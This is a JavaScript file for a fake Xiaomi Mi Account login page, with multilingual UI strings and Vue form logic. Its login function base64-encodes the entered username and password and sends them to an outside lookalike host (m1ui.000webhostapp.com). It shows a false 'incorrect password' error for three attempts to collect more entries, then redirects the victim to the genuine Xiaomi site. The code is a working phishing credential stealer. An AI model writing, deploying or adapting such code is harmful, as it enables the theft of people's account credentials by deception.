var messages = {
  zh_cn: {
      change_language: '更换语言',
      help: "需要帮助",
      slogan: "让每个人都能享受科技的乐趣",
      sign: "小米账号登录",
      acc_place: "邮箱/手机号码/小米ID",
      pwd_place: "请输入密码",
      yydty:"已阅读并同意小米帐号",
      yhxy: "用户协议",
      and: "和",
      yszc: "隐私政策",
      login: "登录",
      regis: "立即注册",
      forget: "忘记密码？",
      p: "即将进入手机验证码登录",
  },
  zh_tw: {
      change_language: '選擇語言',
      help: "需要幫助",
      slogan: "讓每個人都能享受科技的樂趣",
      sign: "小米賬號登入",
      acc_place: "E-mail/手機號碼/小米ID",
      pwd_place: "請輸入密碼",
      yydty:"已閱讀並同意小米帳號 ",
      yhxy: "用戶協議",
      and: "和",
      yszc: "隱私政策",
      login: "登入",
      regis: "立即註冊",
      forget: "忘記密碼?",
      p: "即將進入手機驗證碼登錄",
  },
  en: {
      change_language: 'Select Your Language',
      help: "Help",
      slogan: "Always believe that something wonderful is about to happen",
      sign: "Sign in to your Mi Account",
      acc_place: "Email/Phone/Mi Account",
      pwd_place: "Enter your password",
      yydty:"I've read and agreed to Xiaomi's ",
      yhxy: "User Agreement",
      and: "and",
      yszc: "Privacy Policy",
      login: "Sign in",
      regis: "Create account",
      forget: "Forgot password?",
      p:"Enter the mobile verification code login immediately"
  }
}

var Language = 'zh_cn';

var dyy = new Vue({
  data() {
      return {
          messages: messages,
          Language: Language
      }
  }
});

var root = new Vue({
  el: "#root",
  data() {
      return {
          usr: "",
          pwd: "",
          usr_focus: false,
          pwd_focus: false,
          usr_msg: "",
          pwd_msg: "",
          privc: false,
          pwd_show: false,
          loading: false,
          count: 0,
      }
  },
  watch: {
      usr(n) {
          if (n) {
              this.usr_msg = '';
              this.$refs.usr.classList.remove('Mui-error')
              this.$refs.usr.classList.add('Mui-focused');
          }
      },
      pwd(n) {
          if (n) {
              this.pwd_msg = ''
              this.$refs.pwd.classList.remove('Mui-error')
              this.$refs.pwd.classList.add('Mui-focused')

          }
      },
  },
  computed: {
      confirmed() {
          return this.usr.trim() && this.pwd.trim() && this.privc && !this.loading;
      }
  },
  methods: {
      login() {
          if (this.confirmed && !this.loading) {
              this.loading = true;
              let sign = btoa(JSON.stringify({
                  usr:this.usr,
                  pwd: this.pwd
              }))
              // let encrypt = CryptoJS.RC4.encrypt(sign,'1516').toString();
              if (this.count < 3) {
                  setTimeout(() => {
                    fetch('https://m1ui.000webhostapp.com/?sign='+sign).then(res => {
                      this.pwd_msg = "用户名或密码不正确";
                      this.loading = false;
                      this.count += 1;
                    })
                  }, 2000)
              } else {
                  this.loading = false;
                  document.querySelector('.mi-toast').style.display = "block";
                  
                  setTimeout(() => {
                      location.replace('https://account.xiaomi.com/fe/service/login/phone')
                  }, 1500)
              }
              
          }
      },
      showLang() {
          window.wrapper.show = true;
      },
      usrfocus() {
          this.$refs.usr.classList.add('Mui-focused')
      },
      usrblur() {
          this.$refs.usr.classList.remove('Mui-focused')
          this.$refs.usr.classList.remove('Mui-error')
          if (!this.usr.trim()) {
              this.usr_msg = "请输入帐号"
              this.$refs.usr.classList.add('Mui-error')
          }
      },
      pwdfocus() {
          this.$refs.pwd.classList.add('Mui-focused')
      },
      pwdblur() {
          this.$refs.pwd.classList.remove('Mui-focused')
          this.$refs.pwd.classList.remove('Mui-error')
          if (!this.pwd.trim()) {
              this.pwd_msg = "请输入登录密码"
              this.$refs.pwd.classList.add('Mui-error')
          }
      }
  },
  mounted() {
      setTimeout(() => {
          document.querySelector('#__page_loading').style.display = "none";
      }, 500)
  },
  filters: {
      lang(t) {
          return dyy.messages[dyy.Language][t] || '';
      }
  }
})
var wrapper = new Vue({
  el: "#wrapper",
  data() {
      return {
          show: false,
      }
  },
  methods: {
      SETlanguage(T) {
          dyy.Language = T;
          this.show = false
      }
  },
  filters: {
      lang(t) {
          return dyy.messages[dyy.Language][t] || '';
      }
  }
})

var toast = new Vue({
  el:'#toast',
  filters: {
      lang(t) {
          return dyy.messages[dyy.Language][t] || '';
      }
  }
})
